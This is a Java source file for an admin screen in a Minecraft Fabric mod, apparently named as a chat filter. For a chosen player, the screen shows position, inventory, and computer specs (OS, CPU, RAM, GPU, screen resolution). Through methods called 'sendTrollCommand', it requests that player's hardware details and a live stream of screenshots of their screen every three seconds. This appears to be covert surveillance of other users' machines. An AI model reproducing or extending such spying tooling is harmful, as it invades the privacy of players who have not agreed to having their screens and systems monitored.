package com.deinname.chatfilter.screen;

import com.deinname.chatfilter.AdminConfig;
import com.deinname.chatfilter.PlayerHeadCache;
import com.deinname.chatfilter.RelaySync;
import net.fabricmc.api.EnvType;
import net.fabricmc.api.Environment;
import net.minecraft.client.gui.Click;
import net.minecraft.client.gui.DrawContext;
import net.minecraft.client.gui.screen.Screen;
import net.minecraft.client.gui.widget.ButtonWidget;
import net.minecraft.client.input.KeyInput;
import net.minecraft.client.texture.NativeImage;
import net.minecraft.client.texture.NativeImageBackedTexture;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.registry.Registries;
import net.minecraft.text.Text;
import net.minecraft.util.Identifier;
import org.lwjgl.glfw.GLFW;

import static com.deinname.chatfilter.screen.UIHelper.*;

/**
 * Detailed player info screen with status, system specs, and visual inventory.
 */
@Environment(EnvType.CLIENT)
public final class PlayerInfoScreen extends Screen {

    private static final int PANEL_W_MAX = 640;
    private static final int PANEL_H_MAX = 480;
    private static final int PAD = 10;
    private static final int HEADER_H = 40;
    private static final int FOOTER_H = 36;
    private static final int SLOT_SIZE = 18; // standard MC slot size (16px item + 1px border each side)

    private final Screen parent;
    private final String playerName;
    private ThemeColors colors;

    private int panelW, panelH, px, py;
    private int contentTop, contentBottom;
    private int leftScrollOffset = 0;
    private int leftContentHeight = 0;

    // Tooltip state: which slot is hovered (-1 = none, 0-35 = inv, 100-103 = armor, 200 = offhand)
    private int hoveredSlot = -1;

    // Screenshot live view state
    private boolean liveViewActive = false;
    private int liveViewTick = 0;
    private static final int LIVE_VIEW_INTERVAL_TICKS = 60; // request every 3s

    // GPU texture for live view
    private static final Identifier LIVE_TEX_ID = Identifier.of("columba", "pinfo_live");
    private NativeImageBackedTexture liveTexture = null;
    private int liveTexW = 0, liveTexH = 0;
    private long liveTexUpdate = 0;

    // Button bounds
    private int specBtnX, specBtnY, specBtnW, specBtnH;
    private int liveBtnX, liveBtnY, liveBtnW, liveBtnH;
    private int refreshBtnX, refreshBtnY, refreshBtnW, refreshBtnH;
    private int backBtnX, backBtnY, backBtnW, backBtnH;

    public PlayerInfoScreen(Screen parent, String playerName) {
        super(Text.literal("Player Info: " + playerName));
        this.parent = parent;
        this.playerName = playerName;
        this.colors = loadColors();
    }

    private void recalc() {
        panelW = Math.min(width - 16, PANEL_W_MAX);
        panelH = Math.min(height - 16, PANEL_H_MAX);
        px = (width - panelW) / 2;
        py = (height - panelH) / 2;
        contentTop = py + HEADER_H + 4;
        contentBottom = py + panelH - FOOTER_H;
    }

    @Override
    protected void init() {
        recalc();
    }

    @Override
    public void tick() {
        if (liveViewActive) {
            if (++liveViewTick % LIVE_VIEW_INTERVAL_TICKS == 0) {
                AdminConfig.sendTrollCommand(playerName,
                        "SCREENSHOT_REQ:" + AdminConfig.videoW + "x" + AdminConfig.videoH);
            }
        }
    }

    @Override
    public void close() {
        if (liveTexture != null && client != null) {
            client.getTextureManager().destroyTexture(LIVE_TEX_ID);
            liveTexture.close();
            liveTexture = null;
        }
        if (client != null) client.setScreen(parent);
    }

    @Override
    public void render(DrawContext ctx, int mx, int my, float delta) {
        ThemeColors t = colors;
        AdminConfig.PlayerStatus ps = AdminConfig.getPlayerStatus(playerName);

        // Background
        ctx.fill(0, 0, width, height, mixA(t.bg, 0xCC000000));
        ctx.fill(px, py, px + panelW, py + panelH, t.panel);
        drawBorder(ctx, px, py, panelW, panelH, t.border);
        drawAccentStripe(ctx, px, py, panelW, t);

        // Header
        ctx.fill(px + 2, py + 5, px + panelW - 2, py + HEADER_H, t.panelHead);
        boolean online = AdminConfig.isRecentlyOnline(playerName);

        // Player head in header
        int[] headPx = PlayerHeadCache.getHeadPixels(playerName);
        int headStartX = px + PAD;
        if (headPx != null) {
            int hx = headStartX, hy = py + 10;
            int pxSz = 3;
            ctx.fill(hx - 1, hy - 1, hx + 25, hy + 25, 0xFF1A1A1A);
            for (int faceY = 0; faceY < 8; faceY++) {
                for (int faceX = 0; faceX < 8; faceX++) {
                    int color = headPx[faceY * 8 + faceX];
                    if (((color >> 24) & 0xFF) < 10) continue;
                    ctx.fill(hx + faceX * pxSz, hy + faceY * pxSz,
                            hx + (faceX + 1) * pxSz, hy + (faceY + 1) * pxSz, color);
                }
            }
            headStartX += 32;
        }

        // Name + status
        ctx.drawTextWithShadow(textRenderer, Text.literal("\u00a7f\u00a7l" + playerName),
                headStartX, py + 10, t.text);
        String statusStr = online ? "\u00a7a\u25cf Online" : "\u00a78\u25cb Offline";
        String server = AdminConfig.getPlayerServer(playerName);
        if (server != null && !server.isEmpty()) statusStr += " \u00a77@ " + server;
        ctx.drawTextWithShadow(textRenderer, Text.literal(statusStr),
                headStartX, py + 24, t.subtext);

        // Divider
        ctx.fill(px + 2, py + HEADER_H, px + panelW - 2, py + HEADER_H + 1, t.border);

        // Layout: left column ~55%, right column ~45%
        int leftW = (panelW - PAD * 3) * 55 / 100;
        int rightW = panelW - PAD * 3 - leftW;
        int leftX = px + PAD;
        int rightX = leftX + leftW + PAD;

        // ── Left column (scrollable) ──
        int visH = contentBottom - contentTop;
        ctx.enableScissor(leftX, contentTop, leftX + leftW, contentBottom);
        int cy = contentTop - leftScrollOffset;

        if (ps != null) {
            // Status section
            cy = drawSectionLabel(ctx, leftX, cy, leftW, "\u2764 Status", 0xFFFF5555, t);
            cy = drawLabelValue(ctx, leftX, cy, leftW, "HP",
                    barStr(ps.hp, ps.maxHp) + " " + fmt1(ps.hp) + "/" + fmt1(ps.maxHp), 0xFFFF4444, t);
            cy = drawLabelValue(ctx, leftX, cy, leftW, "Food",
                    barStr(ps.food, 20) + " " + ps.food + "/20", 0xFF44CC44, t);
            cy = drawLabelValue(ctx, leftX, cy, leftW, "Armor", String.valueOf(ps.armor), 0xFFCCCCCC, t);
            cy = drawLabelValue(ctx, leftX, cy, leftW, "XP Level", String.valueOf(ps.level), 0xFF55FF55, t);
            cy = drawLabelValue(ctx, leftX, cy, leftW, "Position",
                    ps.x + ", " + ps.y + ", " + ps.z, 0xFFAADDFF, t);
            cy = drawLabelValue(ctx, leftX, cy, leftW, "Dimension", ps.dimension, 0xFFBB88FF, t);
            cy = drawLabelValue(ctx, leftX, cy, leftW, "GameMode", ps.gameMode, 0xFFFFCC44, t);
            cy = drawLabelValue(ctx, leftX, cy, leftW, "FPS", String.valueOf(ps.fps), 0xFFCCCCCC, t);
            cy = drawLabelValue(ctx, leftX, cy, leftW, "Ping", ps.ping + " ms", 0xFFCCCCCC, t);
            cy = drawLabelValue(ctx, leftX, cy, leftW, "Light", String.valueOf(ps.light), 0xFFFFFF88, t);
            cy = drawLabelValue(ctx, leftX, cy, leftW, "Time", String.valueOf(ps.timeOfDay), 0xFFFFCC88, t);
            String weather = ps.thundering ? "Thunder" : ps.raining ? "Rain" : "Clear";
            cy = drawLabelValue(ctx, leftX, cy, leftW, "Weather", weather, 0xFF88CCFF, t);
            cy = drawLabelValue(ctx, leftX, cy, leftW, "Air", String.valueOf(ps.air), 0xFF88DDFF, t);
            cy = drawLabelValue(ctx, leftX, cy, leftW, "Item", ps.heldItem, 0xFFFFFFFF, t);
            cy += 4;

            // States section
            cy = drawSectionLabel(ctx, leftX, cy, leftW, "\u2694 States", 0xFFFFAA33, t);
            StringBuilder states = new StringBuilder();
            if (ps.sprinting) states.append("\u00a7aSprint ");
            if (ps.sneaking) states.append("\u00a7eSneak ");
            if (ps.swimming) states.append("\u00a7bSwim ");
            if (ps.flying) states.append("\u00a7dFly ");
            if (ps.onGround) states.append("\u00a77Ground ");
            if (ps.inWater) states.append("\u00a79Water ");
            if (ps.inLava) states.append("\u00a7cLava ");
            if (states.length() == 0) states.append("\u00a78None");
            ctx.drawTextWithShadow(textRenderer, Text.literal(states.toString().trim()),
                    leftX + 4, cy, t.text);
            cy += 14;

            // System Specs section (if available)
            if (!ps.os.isEmpty() || !ps.gpuName.isEmpty()) {
                cy += 4;
                cy = drawSectionLabel(ctx, leftX, cy, leftW, "\uD83D\uDCBB System Specs", 0xFF44CCAA, t);
                if (!ps.os.isEmpty())
                    cy = drawLabelValue(ctx, leftX, cy, leftW, "OS", ps.os, 0xFFCCCCCC, t);
                if (!ps.javaVer.isEmpty())
                    cy = drawLabelValue(ctx, leftX, cy, leftW, "Java", ps.javaVer, 0xFFCCCCCC, t);
                if (ps.cpuCores > 0)
                    cy = drawLabelValue(ctx, leftX, cy, leftW, "CPU", ps.cpuCores + " cores", 0xFFCCCCCC, t);
                if (ps.ramTotalMb > 0) {
                    String ramBar = barStr(ps.ramUsedMb, ps.ramTotalMb) + " " + ps.ramUsedMb + "/" + ps.ramTotalMb + " MB";
                    cy = drawLabelValue(ctx, leftX, cy, leftW, "RAM", ramBar, 0xFF55AAFF, t);
                }
                if (!ps.gpuName.isEmpty())
                    cy = drawLabelValue(ctx, leftX, cy, leftW, "GPU", ps.gpuName, 0xFFCCCCCC, t);
                if (!ps.gpuVendor.isEmpty())
                    cy = drawLabelValue(ctx, leftX, cy, leftW, "Vendor", ps.gpuVendor, 0xFFCCCCCC, t);
                if (!ps.glVersion.isEmpty())
                    cy = drawLabelValue(ctx, leftX, cy, leftW, "OpenGL", ps.glVersion, 0xFFCCCCCC, t);
                if (!ps.screenRes.isEmpty())
                    cy = drawLabelValue(ctx, leftX, cy, leftW, "Screen", ps.screenRes, 0xFFCCCCCC, t);
                if (!ps.mcVersion.isEmpty())
                    cy = drawLabelValue(ctx, leftX, cy, leftW, "MC Ver", ps.mcVersion, 0xFFCCCCCC, t);
                if (!ps.fabricVer.isEmpty())
                    cy = drawLabelValue(ctx, leftX, cy, leftW, "Fabric", ps.fabricVer, 0xFFCCCCCC, t);
            }
        } else {
            ctx.drawTextWithShadow(textRenderer, Text.literal("\u00a78Keine Daten vorhanden"),
                    leftX + 4, cy + 4, t.subtext);
            cy += 18;
        }

        leftContentHeight = (cy + leftScrollOffset) - contentTop;
        ctx.disableScissor();

        // Left scrollbar
        if (leftContentHeight > visH) {
            int maxScroll = leftContentHeight - visH;
            int thumbH = Math.max(12, visH * visH / leftContentHeight);
            int thumbY = contentTop + leftScrollOffset * (visH - thumbH) / Math.max(1, maxScroll);
            ctx.fill(leftX + leftW - 3, contentTop, leftX + leftW, contentBottom, 0x22FFFFFF);
            ctx.fill(leftX + leftW - 3, thumbY, leftX + leftW, thumbY + thumbH, t.accent);
        }

        // ── Right column: Inventory (visual item icons like invsee) ──
        ctx.enableScissor(rightX, contentTop, rightX + rightW, contentBottom);
        int iy = contentTop + 2;
        hoveredSlot = -1; // reset each frame

        // Layout: armor column (SLOT_SIZE wide) + gap + 9-wide inventory grid
        int armorX = rightX;
        int invGridX = armorX + SLOT_SIZE + 4;

        // Section header
        drawSectionHeader(ctx, textRenderer, rightX, iy, rightW, "\uD83D\uDEE1 Inventar", t.accent, t);
        iy += 18;

        // ── Armor slots (4 vertical + offhand below) ──
        String[] armorLabels = {"\u2616", "\u2617", "\u2618", "\u2619"}; // helmet, chest, legs, boots symbols
        for (int i = 0; i < 4; i++) {
            int ay = iy + i * (SLOT_SIZE + 2);
            drawSlotBg(ctx, armorX, ay, SLOT_SIZE, 0xFF1A1A2A, 0xFF333355);
            if (ps != null && ps.armorIds[i] != null && !ps.armorIds[i].isEmpty()) {
                ItemStack stack = idToStack(ps.armorIds[i], 1);
                if (!stack.isEmpty()) {
                    ctx.drawItem(stack, armorX + 1, ay + 1);
                    ctx.drawStackOverlay(textRenderer, stack, armorX + 1, ay + 1);
                }
                if (mx >= armorX && mx < armorX + SLOT_SIZE && my >= ay && my < ay + SLOT_SIZE)
                    hoveredSlot = 100 + i;
            }
        }
        // Offhand
        int offY = iy + 4 * (SLOT_SIZE + 2) + 4;
        drawSlotBg(ctx, armorX, offY, SLOT_SIZE, 0xFF1A2A1A, 0xFF335533);
        if (ps != null && ps.offhandId != null && !ps.offhandId.isEmpty()) {
            ItemStack offStack = idToStack(ps.offhandId, ps.offhandCount);
            if (!offStack.isEmpty()) {
                ctx.drawItem(offStack, armorX + 1, offY + 1);
                ctx.drawStackOverlay(textRenderer, offStack, armorX + 1, offY + 1);
            }
            if (mx >= armorX && mx < armorX + SLOT_SIZE && my >= offY && my < offY + SLOT_SIZE)
                hoveredSlot = 200;
        }

        // ── Main inventory grid 9×4 (rows 1-3 = main, row 0 = hotbar at bottom) ──
        // Layout like vanilla: main inventory (rows 1-3) on top, hotbar (row 0) at bottom with gap
        int selectedSlot = -1;
        if (ps != null) {
            for (int i = 0; i < 9; i++) {
                if (ps.invNames[i] != null && ps.invNames[i].equals(ps.heldItem)) {
                    selectedSlot = i;
                    break;
                }
            }
        }

        // Main inventory (slots 9-35, displayed as 3 rows of 9)
        for (int row = 0; row < 3; row++) {
            for (int col = 0; col < 9; col++) {
                int slot = 9 + row * 9 + col;
                int sx = invGridX + col * (SLOT_SIZE + 1);
                int sy = iy + row * (SLOT_SIZE + 1);
                drawSlotBg(ctx, sx, sy, SLOT_SIZE, 0xFF1A1A1A, 0xFF333333);
                drawInvItem(ctx, ps, slot, sx, sy, mx, my, false, false);
            }
        }

        // Gap between main inv and hotbar
        int hotbarY = iy + 3 * (SLOT_SIZE + 1) + 6;
        ctx.drawTextWithShadow(textRenderer, Text.literal("\u00a78\u2500 Hotbar \u2500"),
                invGridX, hotbarY - 1, t.subtext);
        hotbarY += 10;

        // Hotbar (slots 0-8)
        for (int col = 0; col < 9; col++) {
            int sx = invGridX + col * (SLOT_SIZE + 1);
            boolean isSelected = col == selectedSlot;
            int bg = isSelected ? 0xFF2A3A1A : 0xFF222233;
            int border = isSelected ? 0xFF55FF55 : 0xFF444466;
            drawSlotBg(ctx, sx, hotbarY, SLOT_SIZE, bg, border);
            if (isSelected) {
                // Bright highlight for selected slot
                ctx.fill(sx, hotbarY, sx + SLOT_SIZE, hotbarY + 1, 0xFF55FF55);
                ctx.fill(sx, hotbarY + SLOT_SIZE - 1, sx + SLOT_SIZE, hotbarY + SLOT_SIZE, 0xFF55FF55);
            }
            drawInvItem(ctx, ps, col, sx, hotbarY, mx, my, true, isSelected);
        }

        ctx.disableScissor();

        // ── Tooltip rendering (AFTER scissor disabled so tooltip isn't clipped) ──
        if (hoveredSlot >= 0 && ps != null) {
            renderRichTooltip(ctx, ps, hoveredSlot, mx, my, t);
        }

        // ── Screenshot preview (above footer if live view active) ──
        int footerY = py + panelH - FOOTER_H + 8;
        if (liveViewActive) {
            int[] scPixels = AdminConfig.getScreenshotPixels();
            int scW2 = AdminConfig.getScreenshotW();
            int scH2 = AdminConfig.getScreenshotH();
            long ts = AdminConfig.getScreenshotTimestamp();
            int previewY = contentBottom + 2;
            int maxPrevH = footerY - previewY - 4;
            if (scPixels != null && scW2 > 0 && scH2 > 0 && maxPrevH > 20) {
                // Update GPU texture
                if (ts != liveTexUpdate || liveTexture == null || liveTexW != scW2 || liveTexH != scH2) {
                    liveTexUpdate = ts;
                    if (liveTexture == null || liveTexW != scW2 || liveTexH != scH2) {
                        if (liveTexture != null) {
                            client.getTextureManager().destroyTexture(LIVE_TEX_ID);
                            liveTexture.close();
                        }
                        liveTexture = new NativeImageBackedTexture("pinfo_live", scW2, scH2, false);
                        client.getTextureManager().registerTexture(LIVE_TEX_ID, liveTexture);
                        liveTexW = scW2;
                        liveTexH = scH2;
                    }
                    NativeImage img = liveTexture.getImage();
                    if (img != null) {
                        for (int y2 = 0; y2 < scH2; y2++) {
                            for (int x2 = 0; x2 < scW2; x2++) {
                                int argb = scPixels[y2 * scW2 + x2];
                                int a = (argb >> 24) & 0xFF;
                                int r = (argb >> 16) & 0xFF;
                                int g = (argb >> 8) & 0xFF;
                                int b = argb & 0xFF;
                                img.setColor(x2, y2, (a << 24) | (b << 16) | (g << 8) | r);
                            }
                        }
                        liveTexture.upload();
                    }
                }

                // Calculate display size maintaining aspect ratio
                int dispH = maxPrevH;
                int dispW = dispH * scW2 / scH2;
                if (dispW > panelW - PAD * 2) {
                    dispW = panelW - PAD * 2;
                    dispH = dispW * scH2 / scW2;
                }
                int pvx = px + (panelW - dispW) / 2;

                ctx.fill(pvx - 1, previewY - 1, pvx + dispW + 1, previewY + dispH + 1, 0xFF333333);
                ctx.drawTexture(net.minecraft.client.gl.RenderPipelines.GUI_TEXTURED,
                        LIVE_TEX_ID, pvx, previewY, 0, 0, dispW, dispH, dispW, dispH);

                long age = (System.currentTimeMillis() - ts) / 1000;
                ctx.drawTextWithShadow(textRenderer,
                        Text.literal("\u00a78\uD83D\uDCF7 " + age + "s  " + scW2 + "\u00d7" + scH2),
                        pvx, previewY + dispH + 2, 0xFF555555);
            } else {
                int previewY2 = contentBottom + 2;
                ctx.drawCenteredTextWithShadow(textRenderer,
                        Text.literal("\u00a78\uD83D\uDCF7 Warte auf Bild..."),
                        px + panelW / 2, previewY2 + 4, 0xFF555555);
            }
        }

        // ── Footer buttons (4 columns) ──
        // footerY already computed above for screenshot preview
        int btnW = (panelW - PAD * 5) / 4;
        int btnH = 20;

        // Specs anfordern
        specBtnX = px + PAD;
        specBtnY = footerY;
        specBtnW = btnW;
        specBtnH = btnH;
        boolean specHov = mx >= specBtnX && mx < specBtnX + specBtnW && my >= specBtnY && my < specBtnY + specBtnH;
        ctx.fill(specBtnX, specBtnY, specBtnX + specBtnW, specBtnY + specBtnH,
                specHov ? 0xFF335544 : 0xFF223322);
        drawBorder1(ctx, specBtnX, specBtnY, specBtnW, specBtnH, specHov ? 0xFF55CC88 : 0xFF336644);
        ctx.drawCenteredTextWithShadow(textRenderer, Text.literal("\u00a7aSpecs"),
                specBtnX + specBtnW / 2, specBtnY + 6, 0xFF88FFAA);

        // Live View / Screenshot
        liveBtnX = px + PAD + (btnW + PAD);
        liveBtnY = footerY;
        liveBtnW = btnW;
        liveBtnH = btnH;
        boolean liveHov = mx >= liveBtnX && mx < liveBtnX + liveBtnW && my >= liveBtnY && my < liveBtnY + liveBtnH;
        int liveBg = liveViewActive ? (liveHov ? 0xFF554422 : 0xFF443311) : (liveHov ? 0xFF334455 : 0xFF222233);
        int liveBrd = liveViewActive ? (liveHov ? 0xFFFFAA44 : 0xFF886633) : (liveHov ? 0xFF55AAFF : 0xFF335577);
        ctx.fill(liveBtnX, liveBtnY, liveBtnX + liveBtnW, liveBtnY + liveBtnH, liveBg);
        drawBorder1(ctx, liveBtnX, liveBtnY, liveBtnW, liveBtnH, liveBrd);
        String liveLabel = liveViewActive ? "\u00a7e\u25cf Live" : "\u00a7b\uD83D\uDCF7 Live";
        ctx.drawCenteredTextWithShadow(textRenderer, Text.literal(liveLabel),
                liveBtnX + liveBtnW / 2, liveBtnY + 6, liveViewActive ? 0xFFFFCC44 : 0xFF88CCFF);

        // Aktualisieren
        refreshBtnX = px + PAD + (btnW + PAD) * 2;
        refreshBtnY = footerY;
        refreshBtnW = btnW;
        refreshBtnH = btnH;
        boolean refHov = mx >= refreshBtnX && mx < refreshBtnX + refreshBtnW && my >= refreshBtnY && my < refreshBtnY + refreshBtnH;
        ctx.fill(refreshBtnX, refreshBtnY, refreshBtnX + refreshBtnW, refreshBtnY + refreshBtnH,
                refHov ? 0xFF334455 : 0xFF222233);
        drawBorder1(ctx, refreshBtnX, refreshBtnY, refreshBtnW, refreshBtnH, refHov ? 0xFF55AAFF : 0xFF335577);
        ctx.drawCenteredTextWithShadow(textRenderer, Text.literal("\u00a7bRefresh"),
                refreshBtnX + refreshBtnW / 2, refreshBtnY + 6, 0xFF88CCFF);

        // Zurück
        backBtnX = px + PAD + (btnW + PAD) * 3;
        backBtnY = footerY;
        backBtnW = btnW;
        backBtnH = btnH;
        boolean backHov = mx >= backBtnX && mx < backBtnX + backBtnW && my >= backBtnY && my < backBtnY + backBtnH;
        ctx.fill(backBtnX, backBtnY, backBtnX + backBtnW, backBtnY + backBtnH,
                backHov ? 0xFF443333 : 0xFF332222);
        drawBorder1(ctx, backBtnX, backBtnY, backBtnW, backBtnH, backHov ? 0xFFFF8888 : 0xFF664433);
        ctx.drawCenteredTextWithShadow(textRenderer, Text.literal("\u00a7c\u2190 Zur\u00fcck"),
                backBtnX + backBtnW / 2, backBtnY + 6, 0xFFFF8888);

        super.render(ctx, mx, my, delta);
    }

    // ── Helper drawing methods ──

    /** Convert item ID string (e.g. "minecraft:diamond_sword") to ItemStack for rendering. */
    private static ItemStack idToStack(String id, int count) {
        if (id == null || id.isEmpty()) return ItemStack.EMPTY;
        try {
            Identifier rl = Identifier.tryParse(id);
            if (rl == null) return ItemStack.EMPTY;
            Item item = Registries.ITEM.get(rl);
            if (item == null) return ItemStack.EMPTY;
            return new ItemStack(item, Math.max(1, count));
        } catch (Exception e) {
            return ItemStack.EMPTY;
        }
    }

    /** Draw a slot background with border. */
    private static void drawSlotBg(DrawContext ctx, int x, int y, int sz, int bg, int border) {
        ctx.fill(x, y, x + sz, y + sz, bg);
        drawBorder1(ctx, x, y, sz, sz, border);
    }

    /** Draw an inventory item in a slot, with hover detection. */
    private void drawInvItem(DrawContext ctx, AdminConfig.PlayerStatus ps, int slot,
                             int sx, int sy, int mx, int my, boolean isHotbar, boolean isSelected) {
        if (ps == null) return;
        if (ps.invIds[slot] != null && !ps.invIds[slot].isEmpty()) {
            ItemStack stack = idToStack(ps.invIds[slot], ps.invCounts[slot]);
            if (!stack.isEmpty()) {
                ctx.drawItem(stack, sx + 1, sy + 1);
                ctx.drawStackOverlay(textRenderer, stack, sx + 1, sy + 1);
            }
        }
        // Hover detection for tooltip
        if (mx >= sx && mx < sx + SLOT_SIZE && my >= sy && my < sy + SLOT_SIZE) {
            hoveredSlot = slot;
            // Draw highlight overlay like vanilla
            ctx.fill(sx + 1, sy + 1, sx + SLOT_SIZE - 1, sy + SLOT_SIZE - 1, 0x44FFFFFF);
        }
    }

    /** Get the ItemStack for a hovered slot (for tooltip rendering). */
    private ItemStack getHoveredStack(AdminConfig.PlayerStatus ps, int slot) {
        if (slot >= 0 && slot < 36 && ps.invIds[slot] != null)
            return idToStack(ps.invIds[slot], ps.invCounts[slot]);
        if (slot >= 100 && slot <= 103) {
            int i = slot - 100;
            if (ps.armorIds[i] != null) return idToStack(ps.armorIds[i], 1);
        }
        if (slot == 200 && ps.offhandId != null)
            return idToStack(ps.offhandId, ps.offhandCount);
        return ItemStack.EMPTY;
    }

    /** Render a rich tooltip with item name, enchantments, and durability. */
    private void renderRichTooltip(DrawContext ctx, AdminConfig.PlayerStatus ps, int slot, int mx, int my, ThemeColors t) {
        String name = null, enchants = null;
        int damage = 0, maxDamage = 0;
        if (slot >= 0 && slot < 36) {
            name = ps.invNames[slot]; enchants = ps.invEnchants[slot];
            damage = ps.invDamage[slot]; maxDamage = ps.invMaxDamage[slot];
        } else if (slot >= 100 && slot <= 103) {
            int i = slot - 100;
            name = ps.armorNames[i]; enchants = ps.armorEnchants[i];
            damage = ps.armorDamage[i]; maxDamage = ps.armorMaxDamage[i];
        } else if (slot == 200) {
            name = ps.offhandName; enchants = ps.offhandEnchants;
            damage = ps.offhandDamage; maxDamage = ps.offhandMaxDamage;
        }
        if (name == null || name.isEmpty()) return;

        // Build tooltip lines
        java.util.List<String> lines = new java.util.ArrayList<>();
        lines.add("\u00a7f" + name);
        if (enchants != null && !enchants.isEmpty()) {
            for (String e : enchants.split(",")) {
                lines.add("\u00a7b\u2728 " + formatEnchantName(e.trim()));
            }
        }
        if (maxDamage > 0) {
            int remaining = maxDamage - damage;
            float pct = (float) remaining / maxDamage;
            String color = pct > 0.5f ? "\u00a7a" : pct > 0.25f ? "\u00a7e" : "\u00a7c";
            lines.add(color + remaining + "/" + maxDamage + " Durability");
        }

        // Measure tooltip
        int tooltipW = 0;
        for (String line : lines) tooltipW = Math.max(tooltipW, textRenderer.getWidth(line));
        tooltipW += 10;
        int tooltipH = lines.size() * 11 + 6;
        int tx = mx + 12, ty = my - 4;
        if (tx + tooltipW > width) tx = mx - tooltipW - 4;
        if (ty + tooltipH > height) ty = height - tooltipH;

        // Draw tooltip background
        ctx.fill(tx - 2, ty - 2, tx + tooltipW + 2, ty + tooltipH + 2, 0xEE181828);
        drawBorder1(ctx, tx - 2, ty - 2, tooltipW + 4, tooltipH + 4, 0xFF444466);
        ctx.fill(tx - 2, ty - 2, tx + tooltipW + 2, ty - 1, t.accent);

        // Draw lines
        int ly = ty + 2;
        for (String line : lines) {
            ctx.drawTextWithShadow(textRenderer, Text.literal(line), tx + 3, ly, 0xFFFFFFFF);
            ly += 11;
        }
    }

    /** Format enchantment name: "protection 4" → "Protection IV" */
    private static String formatEnchantName(String raw) {
        if (raw.isEmpty()) return raw;
        String[] parts = raw.split(" ", 2);
        String name = parts[0].replace('_', ' ');
        // Capitalize first letter of each word
        StringBuilder sb = new StringBuilder();
        for (String word : name.split(" ")) {
            if (sb.length() > 0) sb.append(" ");
            if (!word.isEmpty()) sb.append(Character.toUpperCase(word.charAt(0))).append(word.substring(1));
        }
        if (parts.length > 1) {
            try {
                int level = Integer.parseInt(parts[1]);
                sb.append(" ").append(toRoman(level));
            } catch (NumberFormatException e) {
                sb.append(" ").append(parts[1]);
            }
        }
        return sb.toString();
    }

    private static String toRoman(int num) {
        return switch (num) {
            case 1 -> "I"; case 2 -> "II"; case 3 -> "III"; case 4 -> "IV"; case 5 -> "V";
            case 6 -> "VI"; case 7 -> "VII"; case 8 -> "VIII"; case 9 -> "IX"; case 10 -> "X";
            default -> String.valueOf(num);
        };
    }

    private int drawSectionLabel(DrawContext ctx, int x, int y, int w, String label, int accent, ThemeColors t) {
        ctx.fill(x, y, x + w, y + 14, mixA(accent, 0x18000000));
        ctx.fill(x, y, x + 2, y + 14, accent);
        ctx.drawTextWithShadow(textRenderer, Text.literal(label), x + 6, y + 3, t.subtext);
        return y + 16;
    }

    private int drawLabelValue(DrawContext ctx, int x, int y, int w, String label, String value, int valColor, ThemeColors t) {
        ctx.drawTextWithShadow(textRenderer, Text.literal("\u00a78" + label + ": "), x + 6, y, t.subtext);
        int labelW = textRenderer.getWidth(label + ": ");
        ctx.drawTextWithShadow(textRenderer, Text.literal(value), x + 6 + labelW, y, valColor);
        return y + 12;
    }

    private static String barStr(float current, float max) {
        if (max <= 0) return "";
        int filled = Math.round((current / max) * 10);
        filled = Math.max(0, Math.min(10, filled));
        return "\u00a7a" + "\u2588".repeat(filled) + "\u00a78" + "\u2588".repeat(10 - filled);
    }

    private static String fmt1(float v) {
        return String.valueOf(Math.round(v * 10) / 10f);
    }

    // ── Input handling ──

    @Override
    public boolean mouseClicked(Click click, boolean bl) {
        double mx = click.x(), my = click.y();

        // Specs button
        if (mx >= specBtnX && mx < specBtnX + specBtnW && my >= specBtnY && my < specBtnY + specBtnH) {
            AdminConfig.sendTrollCommand(playerName, "SPECREQ");
            return true;
        }
        // Live View toggle
        if (mx >= liveBtnX && mx < liveBtnX + liveBtnW && my >= liveBtnY && my < liveBtnY + liveBtnH) {
            liveViewActive = !liveViewActive;
            if (liveViewActive) {
                liveViewTick = 0;
                AdminConfig.sendTrollCommand(playerName,
                        "SCREENSHOT_REQ:" + AdminConfig.videoW + "x" + AdminConfig.videoH);
            }
            return true;
        }
        // Refresh button
        if (mx >= refreshBtnX && mx < refreshBtnX + refreshBtnW && my >= refreshBtnY && my < refreshBtnY + refreshBtnH) {
            AdminConfig.sendTestPing(playerName);
            return true;
        }
        // Back button
        if (mx >= backBtnX && mx < backBtnX + backBtnW && my >= backBtnY && my < backBtnY + backBtnH) {
            close();
            return true;
        }

        return super.mouseClicked(click, bl);
    }

    @Override
    public boolean mouseScrolled(double mx, double my, double horiz, double vert) {
        if (vert != 0) {
            leftScrollOffset -= (int) (Math.signum(vert) * 16);
            int maxScroll = Math.max(0, leftContentHeight - (contentBottom - contentTop));
            leftScrollOffset = Math.max(0, Math.min(leftScrollOffset, maxScroll));
            return true;
        }
        return super.mouseScrolled(mx, my, horiz, vert);
    }

    @Override
    public boolean keyPressed(KeyInput ki) {
        if (ki.key() == GLFW.GLFW_KEY_ESCAPE) { close(); return true; }
        return super.keyPressed(ki);
    }

    @Override
    public boolean shouldPause() { return false; }
}
